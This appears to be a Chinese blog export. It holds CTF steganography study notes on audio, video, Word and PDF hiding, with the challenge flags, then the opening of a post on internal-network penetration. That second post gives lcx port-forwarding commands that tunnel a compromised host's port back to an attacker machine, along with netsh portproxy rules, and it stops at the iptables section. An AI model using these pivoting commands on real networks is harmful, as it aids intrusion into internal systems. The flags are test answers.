<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">..</span> -<span class="string">.-.</span> <span class="string">....</span> <span class="string">..-</span> -. --<span class="string">.-</span> <span class="string">..</span> <span class="string">..-</span> -- <span class="params">---</span> <span class="string">.-.</span> <span class="string">...</span> . - . <span class="string">...</span> -</span><br></pre></td></tr></table></figure>

<p>翻译得：</p>
<p>ICHUNQIUMORSETEST</p>
<p><strong>思考与实践</strong></p>
<ol>
<li>利用lakey这个软件给制作一个自己ID的摩尔斯电文吧。</li>
</ol>
<h5 id="B-MP3stego工具隐写"><a href="#B-MP3stego工具隐写" class="headerlink" title="B.MP3stego工具隐写"></a>B.MP3stego工具隐写</h5><p><strong>MP3stego介绍</strong></p>
<p>MP3stego是著名的音频数据隐写工具，支持常见的压缩音频文件格式如mp3的数据嵌入，它采用的是一种特殊的量化方法，并且将数据隐藏在MP3文件的奇偶校验块中。</p>
<p><strong>使用方法</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TP"><figure class="iseeu highlight /tp"><table><tr><td class="code"><pre><span class="line">用MP3Stego进行加密解密：</span><br><span class="line">加密：encode -E 加密文本 -<span class="keyword">P</span> 密码  wav文件 mp<span class="number">3</span>文件</span><br><span class="line">解密：decode -<span class="keyword">X</span> -<span class="keyword">P</span>  密码  mp<span class="number">3</span>文件</span><br></pre></td></tr></table></figure></div>

<p><strong>实验：</strong></p>
<p>小明想和小红告白，在一个首歌中藏了一个txt文件，可是小红却不知道怎么找到mp3文件中的隐藏信息，你能帮帮她吗？ hit： password： love</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到love.mp3 文件</span><br><span class="line"><span class="bullet">- </span>我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line"><span class="bullet">- </span>因为有个提示，这里我们用到了密码加密，我们可以猜测是否是用mp3stego进行的隐写呢？</span><br><span class="line"><span class="bullet">- </span>在工具文件中找到mp3stego，将目标文件拷贝到工具的目录下</span><br><span class="line"><span class="bullet">- </span>尝试提取隐藏信息，最后的flag是flag&#123;I<span class="emphasis">_love_</span>you&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>首先先将目标文件复制到MP3stego这个工具的目录下</strong></p>
<p><img src="https://i.loli.net/2020/06/14/YcXyOzFIotKpkjU.png" alt="image-20200614100259368"></p>
<p><strong>在CMD下使用Decode.exe程序进行提取</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Decode</span><span class="selector-class">.exe</span> <span class="selector-tag">-X</span> <span class="selector-tag">-P</span> <span class="selector-tag">love</span> <span class="selector-tag">love</span><span class="selector-class">.mp3</span></span><br></pre></td></tr></table></figure></div>

<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614100932009.png" alt="image-20200614100932009"></p>
<p>最后打开目录下的love.mp3.txt文件就能看到隐写内容了</p>
<p><strong>思考与实践</strong></p>
<ol>
<li>最后小明表白成功了，你是否也可以尝试去做一个MP3隐写呢</li>
</ol>
<h5 id="C-频谱图音频隐写"><a href="#C-频谱图音频隐写" class="headerlink" title="C.频谱图音频隐写"></a>C.频谱图音频隐写</h5><p><strong>背景知识</strong></p>
<p>频谱是频率谱密度的简称，是频率的分布曲线。复杂振荡分解为振幅不同和频率不同的谐振荡，这些谐振荡的幅值按频率排列的图形叫做频谱。<br>在CTF中，我们可以单独只对一个声道中，隐写进信息</p>
<p><strong>实验</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到这有点刺耳.wav的文件</span><br><span class="line"><span class="bullet">- </span>我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line"><span class="bullet">- </span>因为这次是针对频谱的，我们直接用Adobe Aud ton打开目标文件</span><br><span class="line"><span class="bullet">- </span>调整到频谱视图，调整大小，直到能清晰的看到隐写内容</span><br><span class="line"><span class="bullet">- </span>尝试提取隐藏信息，最后的flag是flag&#123;CTF<span class="emphasis">_i5_</span>rea1ly<span class="emphasis">_funny!&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>直接进入正题吧</strong><br>使用AU打开目标文件</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614103023624.png" alt="image-20200614103023624"></p>
<p>调整到频谱图，并调整频谱图大小，直到能看清flag</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104328986.png" alt="image-20200614104328986"></p>
<h5 id="D-波形音频隐写"><a href="#D-波形音频隐写" class="headerlink" title="D.波形音频隐写"></a>D.波形音频隐写</h5><p><strong>背景知识</strong></p>
<p>通常来说，波形方向的题，在观察到异常后，使用相关软件（Audacity, Adobe Audition 等）观察波形规律，将波形进一步转化为 01 字符串等，从而提取转化出最终的 flag。</p>
<p><strong>实验:</strong></p>
<p>ISCC-2017：杂项—-普通的DISCO我们普通的摇<del>~</del></p>
<p>（1）下载一个Disco.wav音频文件，不是以.mp3结尾。那么mp3stego这个工具是无法使用了。</p>
<p>（2）细心的童鞋会注意到，音频开头有一段杂音。然后用音频分析软件打开，这里我用audacity这款工具打开音频文件。如下图所示：</p>
<p><img src="https://i.loli.net/2020/06/16/MFRdSpUiTo2cDBl.png" alt="image-20200616195625454"></p>
<p>这道题就是考个细心程度，当得到这个波形之后就很容易联想到二进制数据，这道题的话因为上下两个音轨是一样的，所以取上面这个，这里可以认为上面一小点是1，下面一小点是0，如下图：</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616201440356.png" alt="image-20200616201440356"></p>
<p>就能得到：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</span></span><br></pre></td></tr></table></figure></div>

<p>然后得到之后首先观察数据，因为很短，所以推测不是文件，应该是处理字符编码得到flag。</p>
<p>首先这里一共是105位</p>
<p>不符合8位一个字符，符合7位，于是在每个7位之前加个0，得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">01100110</span>,<span class="number">01101100</span>,<span class="number">01100001</span>,<span class="number">01100111</span>,<span class="number">01111011</span>,<span class="number">01010111</span>,<span class="number">00110000</span></span><br><span class="line"><span class="number">01010111</span>,<span class="number">00101010</span>,<span class="number">01100110</span>,<span class="number">01110101</span>,<span class="number">01101110</span>,<span class="number">01101110</span>,<span class="number">01111001</span>,</span><br><span class="line"><span class="number">01111101</span></span><br></pre></td></tr></table></figure></div>

<p>最后二进制转十进制，转ASCII得到：flag{W0W*funny}</p>
<p>好吧，这边编码的确恶心人。</p>
<h5 id="E-LSB音频隐写"><a href="#E-LSB音频隐写" class="headerlink" title="E.LSB音频隐写"></a>E.LSB音频隐写</h5><p><strong>背景知识</strong></p>
<p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用Silenteye工具，其介绍如下：</p>
<p>SilentEye是一种跨平台应用程序设计，可轻松使用隐写术，在这种情况下，将消息隐藏为图片或声音。它提供了一个非常漂亮的界面，并通过使用插件系统轻松集成了新的密写算法和加密过程。</p>
<p><strong>实验：</strong></p>
<p>2015 广东省强网杯 - Little Apple</p>
<p>直接使用 <code>slienteye</code> 即可。</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616203211716.png" alt="image-20200616203211716"></p>
<p>这道原题找不到了，但是这主要就是考的知识面，知道这个工具才能做出来</p>
<p><strong>思考与实践</strong></p>
<p>如何做一个音频隐写？</p>
<hr>
<h4 id="二、视频隐写"><a href="#二、视频隐写" class="headerlink" title="二、视频隐写"></a>二、视频隐写</h4><h5 id="A-基于文件结构的隐写"><a href="#A-基于文件结构的隐写" class="headerlink" title="A.基于文件结构的隐写"></a>A.基于文件结构的隐写</h5><p>目前在CTF赛事中较为常出现的视频隐写，一般都是将一场带有隐写信息的图片，嵌入视频中，我们所需要做的就是将这个图片从视频分离出来，然后在分析我们分离出来的文件是什么，之后的操作可能会涉及到密码编码，图片隐写等知识点。</p>
<p>另一方面，我们分离文件，如果单独对视频来说ffmpeg是一个很好的工具，这里我使用的是foremost ，一款linux下的命令行工具，当然我们也可以使用binwalk或者dd等工具，正如我们图片隐写中教大家分离图片所用的方法一样。<br>区别是，ffmpeg将视频分解成一张一张的图片，foremost是一个基于文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。</p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹视频隐写的目录下找到powpow.mp4的文件</span><br><span class="line"><span class="bullet">- </span>我们可以先双击点开，观看下这个视频文件</span><br><span class="line"><span class="bullet">- </span>分离图片，得到一张图片，对图片分析，由提示可知是steghide的图片隐写</span><br><span class="line"><span class="bullet">- </span>之后的操作我们就不复述了, 看一下操作。</span><br><span class="line"><span class="bullet">- </span>flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>首先用foremost分离图片</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">foremost</span> <span class="selector-tag">powpow</span><span class="selector-class">.mp4</span></span><br></pre></td></tr></table></figure></div>

<p><strong>在output目录下找到分离出来的图片</strong></p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104703882.png" alt="image-20200614104703882"></p>
<p>使用命令 <code>steghide extract -sf thing.jpg -p password</code>提取图片隐写内容内容</p>
<p><strong>对提取出来的隐写内容进行解码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; import base64</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; base64.b85decode(b<span class="string">'W^7?+dsk&amp;3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE'</span>)</span><br><span class="line">b<span class="string">'flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;'</span></span><br></pre></td></tr></table></figure></div>

<p>最终的flag是<br>**完整操作命令flag{We are fsociety, we are finally free, we are finally awake!}</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">foremost powpow.mp4</span><br><span class="line">stepic -<span class="selector-tag">i</span> output/png/<span class="number">00001069</span><span class="selector-class">.png</span> -d &gt; thing</span><br><span class="line">steghide extract -sf thing<span class="selector-class">.jpg</span> -<span class="selector-tag">p</span> password</span><br><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b85decode(b<span class="string">'W^7?+dsk&amp;3VRB_4W^-?2X=QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE'</span>)</span><br><span class="line">b<span class="string">'flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;'</span></span><br></pre></td></tr></table></figure></div>



<h5 id="B-MSU-Stego隐写"><a href="#B-MSU-Stego隐写" class="headerlink" title="B.MSU Stego隐写"></a>B.MSU Stego隐写</h5><p>MSU StegoVideo 数据隐写</p>
<p>这个隐写也是考了知识面吧，题目较少</p>
<p><strong>解法：</strong></p>
<p>选中”Extract file from video”:</p>
<p><img src="https://i.loli.net/2020/06/17/IN3oXFRn2YbCqLg.png" alt="image-20200617160830674"></p>
<p>选择带有隐藏信息的文件和一个空白的用于保存提取出来的信息的 .txt 文件：</p>
<p><img src="https://i.loli.net/2020/06/17/cHfvkLS24CjPXr1.png" alt="image-20200617162437195"></p>
<p>输入密码：(这个密码是在生成的时候设置的，考题可能会在其他地方会有提示)</p>
<p><img src="https://i.loli.net/2020/06/17/kOxgqWjHCso7r14.png" alt="image-20200617162556361"></p>
<p>正在进行信息提取操作：</p>
<p><img src="https://i.loli.net/2020/06/17/vaMYhK3obJs62CU.png" alt="image-20200617162609599"></p>
<p>操作完成后，就会得到隐藏的信息。</p>
<p>隐藏的步骤可以自己去尝试</p>
<h5 id="C-TCStego隐写"><a href="#C-TCStego隐写" class="headerlink" title="C.TCStego隐写"></a>C.TCStego隐写</h5><p>和MSU Stego一样，主要是考了知识面</p>
<h3 id="电子文档隐写"><a href="#电子文档隐写" class="headerlink" title="电子文档隐写"></a>电子文档隐写</h3><p>电子文档，它主要包括电子文书、电子信件、电子报表、电子图纸、纸质文本文档的电子版本等等，是人们电脑办公中必不可少的文件。</p>
<h4 id="一、word隐写"><a href="#一、word隐写" class="headerlink" title="一、word隐写"></a>一、word隐写</h4><p>微软的Word一直是文字处理软件中的佼佼者。微软的Word、Excel、PowerPoint提供了许多在文档中隐藏数据的方法，包括批注、个人信息、水印、不可见内容、隐藏文字和定制的XML数据。最简单，也是最奇妙的，也就是这里将提到的隐藏文本功能。</p>
<h5 id="利用隐藏文本功能进行隐写"><a href="#利用隐藏文本功能进行隐写" class="headerlink" title="利用隐藏文本功能进行隐写"></a>利用隐藏文本功能进行隐写</h5><p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打开电子文档隐写，打开flag.doc</span><br><span class="line"><span class="bullet">- </span>在菜单栏中选择，并单击File（文件）-&gt;Tool（工具）-&gt;Option（选项） </span><br><span class="line"><span class="bullet">- </span>找到 隐藏文字 功能，选择这个功能，点击保存</span><br><span class="line"><span class="bullet">- </span>最终flag&#123;doc<span class="emphasis">_stego_</span>is<span class="emphasis">_ez&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>首先打开，flag.doc</strong><br>打开flag.doc，能看到的文字内容只有<code>Flag in here。</code>,我们就可以猜测，flag是被隐藏起来了</p>
<p><img src="https://i.loli.net/2020/06/14/JLdmzNC1kVhTW97.png" alt="image-20200614105634162"></p>
<p><strong>开启隐藏文字显示功能，查看flag是否被隐写</strong><br>在文件栏中，找到选项，打开显示，隐藏文字选项</p>
<p><img src="https://i.loli.net/2020/06/14/YFlaW2tqB4vpiMK.png" alt="image-20200614105617350"></p>
<p><img src="https://i.loli.net/2020/06/14/wgpCzhIvT48irD2.png" alt="image-20200614105314028"></p>
<p><strong>思考</strong></p>
<ol>
<li>尝试将文本中的 Flag in here。 也隐藏掉。</li>
<li>尝试使用word自带的文档检查器检查是否又文字隐藏</li>
</ol>
<h5 id="word文档的xml转换"><a href="#word文档的xml转换" class="headerlink" title="word文档的xml转换"></a>word文档的xml转换</h5><p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被隐藏进其他数据。</p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打开电子文档隐写，打开file.docx</span><br><span class="line"><span class="bullet">- </span>看到的内容是 This is not the flag you're looking for.</span><br><span class="line"><span class="bullet">- </span>我们可以尝试分离word文档</span><br><span class="line"><span class="bullet">- </span>发现，其中包含了一个flag.txt的文件，我们可以直接用7Z，使用zip的方法重新打开file.doc</span><br><span class="line"><span class="bullet">- </span>打开flag.txt，最终flag&#123;this<span class="emphasis">_would_</span>be<span class="emphasis">_the_</span>flag<span class="emphasis">_you_</span>are<span class="emphasis">_looking_</span>for&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>首先，找到文件并打开文件查看</strong></p>
<p><img src="https://i.loli.net/2020/06/14/S8rMghJPwGN5LQX.png" alt="image-20200614105905294"></p>
<p><strong>尝试分离文件内容</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">+bash-<span class="number">4.3</span>$ file file.docx </span><br><span class="line">file.docx: Zip archive data, at least v2.<span class="number">0</span> to extract</span><br><span class="line">+bash-<span class="number">4.3</span>$ <span class="number">7</span>z x file.docx -oout</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>-Zip [<span class="number">64</span>] <span class="number">9.20</span>  Copyright (c) <span class="number">1999</span>-<span class="number">2010</span> Igor Pavlov  <span class="number">2010</span>-<span class="number">11</span>-<span class="number">18</span></span><br><span class="line">p7zip <span class="keyword">Version</span> <span class="number">9.20</span> (<span class="attr">locale=</span>utf8,<span class="attr">Utf16=</span>on,<span class="attr">HugeFiles=</span>on,<span class="number">8</span> CPUs)</span><br><span class="line"></span><br><span class="line">Processing archive: file.docx</span><br><span class="line"></span><br><span class="line">Extracting  word/numbering.xml</span><br><span class="line">Extracting  word/settings.xml</span><br><span class="line">Extracting  word/fontTable.xml</span><br><span class="line">Extracting  word/styles.xml</span><br><span class="line">Extracting  word/document.xml</span><br><span class="line">Extracting  word/_rels/document.xml.rels</span><br><span class="line">Extracting  _rels/.rels</span><br><span class="line">Extracting  [Content_Types].xml</span><br><span class="line">Extracting  flag.txt</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br></pre></td></tr></table></figure></div>

<p>我们会发现又flag.txt的文件被打包在file.docx中，<br><strong>直接用7z等压缩包工具打开file.docx</strong></p>
<p><img src="https://i.loli.net/2020/06/14/Pabuoxc9ENVqSsR.png" alt="image-20200614110300105"></p>
<p><strong>思考</strong></p>
<ol>
<li>思考，如何制作这种隐写呢？</li>
<li>试试能否用binwalk 或者strings等工具查看隐写痕迹。</li>
</ol>
<h4 id="二、PDF文件中的信息隐藏"><a href="#二、PDF文件中的信息隐藏" class="headerlink" title="二、PDF文件中的信息隐藏"></a>二、PDF文件中的信息隐藏</h4><p>PDF隐写中，我们最常用，也是最熟知的工具就是wbStego4open,这是可以把文件隐藏到BMP，TXT,HTM和PDF文件中的工具，当然，这里我们只用他来最为以PDF为载体进行隐写的工具。</p>
<h5 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h5><ul>
<li>wbStego4open</li>
</ul>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>在实验机中找到隐写术目录，打开电子文档隐写，找到  stego.pdf文档</span><br><span class="line"><span class="bullet">- </span>在工具目录中找到 wbStego4open，使用工具载入文档，</span><br><span class="line"><span class="bullet">- </span>根据提示，一步一步完成隐藏信息的提取</span><br><span class="line"><span class="bullet">- </span>最终flag&#123;CTF<span class="emphasis">_is_</span>funny&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>首先找到目标文件</strong><br>在实验机中找到隐写术目录，打开电子文档隐写，找到 stego.pdf文档</p>
<p><strong>其次，找到工具wbStego4open</strong><br>在工具目录中找到 wbStego4open，使用工具载入文档，<br>Step 1 是文件介绍<br>Step 2 中，我们选择Decode，<br>Step 3 我们选择目标文件<br>Step 4 输入加密密码，如果是空密码，直接跳过<br>Step 5 为保存文件为 flag.txt</p>
<p>这道题没了大伙自己网上去找</p>
<p><strong>最后打开保存后的文件，flag.txt</strong><br>最后打开保存后的文件，flag.txt，就能得到flag了。</p>
<p><strong>思考</strong></p>
<ol>
<li>查阅其他资料，是否还要其他的PDF隐写方式，其原理又是什么？</li>
</ol>
<hr>
<h3 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h3><h4 id="一、数据包隐写术"><a href="#一、数据包隐写术" class="headerlink" title="一、数据包隐写术"></a>一、数据包隐写术</h4><p>数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。比较常用的工具是wireshark。关于此类部分的详细介绍，大家可以访问这个网址：<a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/</a></p>
<h5 id="常用工具：-5"><a href="#常用工具：-5" class="headerlink" title="常用工具："></a>常用工具：</h5><ul>
<li>wireshark</li>
</ul>
<p>数据包隐写术目前两种考察行为：</p>
<p>①、flag或者关键信息直接隐藏在流量包中</p>
<p>②、flag相关文件隐藏在流量包中，需要分离文件</p>
<h4 id="二、细微的颜色差别"><a href="#二、细微的颜色差别" class="headerlink" title="二、细微的颜色差别"></a>二、细微的颜色差别</h4><p>就是看细心程度</p>
<p>藏在第一列的第四只皮卡丘的酒窝里</p>
<p><img src="https://i.loli.net/2020/06/14/8nVd4DWyoTqmj5b.png" alt="image-20200614112236379"></p>
<p><img src="https://i.loli.net/2020/06/14/BLQ7jJZIa2kSOCs.png" alt="image-20200614112349386"></p>
<p>其他的题型随时补充</p>
<hr>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>一般的MISC题目都不是简简单单的一个隐写就能解决的，正常都包含了密码，编码，隐写甚至更多的计算机网络知识。</p>
<hr>
<p>本文大部分源于<a href="https://link.zhihu.com/?target=https%3A//xz.aliyun.com/">先知社区</a>中M1n3所作<a href="https://xz.aliyun.com/t/1833" target="_blank" rel="noopener">Misc 总结 —-隐写术之图片隐写</a>一文，对其进行了相应的补充并增加了自己的思考以作为自己的学习笔记，如有侵删。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>CTF,MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透工具</title>
    <url>/undefined/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="TCP内网穿透"><a href="#TCP内网穿透" class="headerlink" title="TCP内网穿透"></a>TCP内网穿透</h2><h3 id="常见内网穿透手段与工具介绍与使用"><a href="#常见内网穿透手段与工具介绍与使用" class="headerlink" title="常见内网穿透手段与工具介绍与使用"></a>常见内网穿透手段与工具介绍与使用</h3><p><strong>使用场景：</strong></p>
<p>攻击者从外网打开了入口，想入侵更多的内网机器</p>
<h4 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h4><p>lcx.exe   netsh   portmap   iptables</p>
<h5 id="LCX端口转发使用："><a href="#LCX端口转发使用：" class="headerlink" title="LCX端口转发使用："></a>LCX端口转发使用：</h5><p>lcx有两大功能：</p>
<ul>
<li>端口转发（listen和slave成对使用）</li>
<li>端口映射（tran）</li>
</ul>
<p><strong>端口转发：</strong></p>
<p>Lcx -Listen &lt;监听slave请求的端口(对应slave的第二个参数)&gt; &lt;等待连接的端口&gt;</p>
<p>Lcx -slave &lt;你的ip&gt; &lt;监听端口(对应listen的第一个参数)&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p>
<p><strong>使用示例：</strong></p>
<p>使用环境：本机外网IP，它机内网IP</p>
<p>本机上运行：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LSL"><figure class="iseeu highlight /lsl"><table><tr><td class="code"><pre><span class="line">lcx -<span class="section">listen</span> <span class="number">34</span> <span class="number">3434</span></span><br></pre></td></tr></table></figure></div>

<p>这句话的意思就是监听本机的34端口然后将数据转发到3434端口</p>
<p>它机上运行：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">lcx -slave <span class="number">10.128</span><span class="number">.2</span><span class="number">.171</span> <span class="number">34</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.134</span> <span class="number">21</span></span><br></pre></td></tr></table></figure></div>

<p>假设本机IP为10.128.2.171 被控机为192.168.56.134</p>
<p>这句话的意思是内网被控机将21端口转发到本机IP—10.128.2.171的34端口上</p>
<p>然后本机就能通过连接本地的3434端口进行监听控制</p>
<h5 id="LCX端口映射使用："><a href="#LCX端口映射使用：" class="headerlink" title="LCX端口映射使用："></a>LCX端口映射使用：</h5><p>lcx有两大功能：</p>
<ul>
<li>端口转发（listen和slave成对使用）</li>
<li>端口映射（tran）</li>
</ul>
<p>Lcx -tran &lt;等待连接的端口&gt; &lt;目标ip&gt; &lt;目标端口&gt;</p>
<p>这句话的意思是将本机的等待映射的端口映射到目标ip 的目标端口</p>
<h5 id="Windows自带的转发工具netsh："><a href="#Windows自带的转发工具netsh：" class="headerlink" title="Windows自带的转发工具netsh："></a>Windows自带的转发工具netsh：</h5><p>配置方法<br>假定需要通过192.168.1.8的14941端口连接192.168.1.118的1494端口，则需要在192.168.1.8主机的命令行输入如下语句</p>
<p><strong>开启IPv6支持</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> interface ipv6 </span>install</span><br></pre></td></tr></table></figure></div>

<p><strong>如果操作系统开启了主机防火墙，需要放行TCP 14941的入站连接，下面是配置端口转发的两条语句，区别不大，一条指定IP，一条默认本机IP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenaddress</span>=192.168.1.8 <span class="attribute">listenport</span>=14941 <span class="attribute">connectaddress</span>=192.168.1.118 <span class="attribute">connectport</span>=1494</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenport</span>=14941 connectaddress =192.168.1.118 <span class="attribute">connectport</span>=1494</span><br></pre></td></tr></table></figure></div>

<p><strong>取消上面配置的端口转发，可以用如下语句：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy delete v4tov4 listenaddress 192.168.1.8 listenport =33891</span><br></pre></td></tr></table></figure></div>

<p><strong>如果想查看已经配置了哪些端口转发，可以用如下语句：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy show v4tov4</span><br></pre></td></tr></table></figure></div>

<h5 id="LINUX自带的转发工具iptables："><a href="#LINUX自带的转发工具iptables：" class="headerlink" title="LINUX自带的转发工具iptables："></a>LINUX自带的转发工具iptables：</h5><p><strong>首先开启内核转发：</strong></p>
